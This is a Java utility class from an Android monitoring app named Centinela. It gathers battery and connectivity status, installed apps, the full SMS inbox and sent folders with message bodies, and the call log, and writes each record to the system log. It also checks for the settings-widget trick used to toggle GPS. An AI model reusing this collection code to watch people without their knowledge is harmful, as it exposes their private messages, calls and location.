package app.vjsantojaca.merinosa.com.centinela;


import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ActivityInfo;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.BatteryManager;
import android.provider.CallLog;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

/*
* Developer Víctor Santoja
 * Centinela App pertenece al proyecto Centinela
*/
public class Utils
{
    public static float getBattery()
    {
        Intent batteryIntent = App.getAppContext().registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);

        if(level == -1 || scale == -1)
            return 50.0f;
        else
            return ((float)level / (float)scale) * 100.0f;

    }

    public static int getNumberPhone()
    {
        SharedPreferences prefs = App.getAppContext().getSharedPreferences("NumberPhone", Context.MODE_PRIVATE);
        return prefs.getInt("numberPhone", 0);
    }

    public static void setNumberPhone(int number)
    {
        SharedPreferences prefs = App.getAppContext().getSharedPreferences("NumberPhone",Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = prefs.edit();
        editor.putInt("numberPhone", number);
        editor.commit();
    }

    public static boolean isOnline()
    {
        ConnectivityManager cm = (ConnectivityManager) App.getAppContext().getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo netInfo = cm.getActiveNetworkInfo();
        if (netInfo != null && netInfo.isConnected())
        {
            return true;
        }
        return false;
    }

    public static JSONArray getSMS()
    {
        Uri uriSMSURI = Uri.parse("content://sms/inbox");
        JSONArray jsonArray = new JSONArray();
        JSONObject object;
        try
        {
            Cursor cur = App.getAppContext().getContentResolver().query(uriSMSURI, null, null, null, null);
            if(cur.moveToFirst())
            {
                for(int i=0; i < cur.getCount(); i++)
                {
                    object = new JSONObject();
                    try
                    {
                        object.put("_id", cur.getString(cur.getColumnIndexOrThrow("_id")));
                        object.put("number", cur.getString(cur.getColumnIndexOrThrow("address")));
                        object.put("date", cur.getString(cur.getColumnIndexOrThrow("date")));
                        object.put("body", cur.getString(cur.getColumnIndexOrThrow("body")));
                        object.put("type", cur.getString(cur.getColumnIndexOrThrow("type")));
                        Log.i(Utils.class.getName(), object.toString());
                    } catch (JSONException e)
                    {
                        e.printStackTrace();
                    }
                    jsonArray.put(object);
                    cur.moveToNext();
                }
            }

            uriSMSURI = Uri.parse("content://sms/sent");
            cur = App.getAppContext().getContentResolver().query(uriSMSURI, null, null, null, null);
            if(cur.moveToFirst())
            {
                for(int i=0; i < cur.getCount(); i++)
                {
                    object = new JSONObject();
                    try
                    {
                        object.put("_id", cur.getString(cur.getColumnIndexOrThrow("_id")));
                        object.put("number", cur.getString(cur.getColumnIndexOrThrow("address")));
                        object.put("date", cur.getString(cur.getColumnIndexOrThrow("date")));
                        object.put("body", cur.getString(cur.getColumnIndexOrThrow("body")));
                        object.put("type", cur.getString(cur.getColumnIndexOrThrow("type")));
                        Log.i(Utils.class.getName(), object.toString());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                    jsonArray.put(object);
                    cur.moveToNext();
                }
            }
        } catch( Exception ex )
        {
            return new JSONArray();
        }
        return jsonArray;
    }

    public static JSONArray getListCalls()
    {
        JSONArray jsonArray = new JSONArray();
        JSONObject object;
        try
        {
            Cursor cur = App.getAppContext().getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
            if (cur.moveToFirst())
            {
                for (int i = 0; i < cur.getCount(); i++)
                {
                    object = new JSONObject();
                    try
                    {
                        object.put("_id", cur.getString(cur.getColumnIndexOrThrow(CallLog.Calls._ID)));
                        object.put("number", cur.getString(cur.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                        object.put("date", cur.getString(cur.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                        object.put("duration", cur.getString(cur.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                        object.put("type", cur.getString(cur.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
                        Log.i(Utils.class.getName(), object.toString());
                    } catch (JSONException e)
                    {
                        e.printStackTrace();
                    }
                    jsonArray.put(object);
                    cur.moveToNext();
                }
            }
        } catch( Exception ex )
        {
            return new JSONArray();
        }
        return jsonArray;
    }

    public static boolean canToggleGPS()
    {
        PackageManager pacman = App.getAppContext().getPackageManager();
        PackageInfo pacInfo = null;
        try
        {
            pacInfo = pacman.getPackageInfo("com.android.settings", PackageManager.GET_RECEIVERS);
        } catch (PackageManager.NameNotFoundException e)
        {
            return false;
        }

        if(pacInfo != null)
        {
            for(ActivityInfo actInfo : pacInfo.receivers)
            {
                if(actInfo.name.equals("com.android.settings.widget.SettingsAppWidgetProvider") && actInfo.exported){
                    return true;
                }
            }
        }
        return false;
    }

    public static JSONArray getListApps()
    {
        List<PackageInfo> packList = App.getAppContext().getPackageManager().getInstalledPackages(0);
        JSONArray array = new JSONArray();
        try
        {
            for (int i = 0; i < packList.size(); i++)
            {
                PackageInfo packInfo = packList.get(i);
                if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0)
                {
                    String appName = packInfo.applicationInfo.loadLabel(App.getAppContext().getPackageManager()).toString();
                    array.put(appName);
                    Log.e("App № " + Integer.toString(i), appName);
                }
            }
        } catch (Exception ex)
        {
            return new JSONArray();
        }
        return array;
    }
}
